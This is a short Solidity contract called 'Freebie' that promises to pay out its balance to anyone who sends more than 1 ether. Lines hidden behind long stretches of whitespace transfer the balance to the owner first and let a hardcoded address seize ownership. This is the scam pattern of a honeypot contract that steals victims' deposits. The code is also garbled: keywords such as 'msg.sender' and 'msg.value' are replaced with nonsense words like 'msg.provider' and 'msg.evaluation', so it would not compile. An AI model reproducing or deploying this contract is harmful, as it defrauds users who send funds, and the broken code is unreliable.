// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.provider;

    function() public payable{}

    function ObtainFreebie()
    public
    payable
    {
        if(msg.evaluation>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.provider.transfer(this.balance);
        }
    }

    function dispenseMedication()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.provider==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.provider == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.provider == Owner);
        adr.call.evaluation(msg.evaluation)(info);
    }
}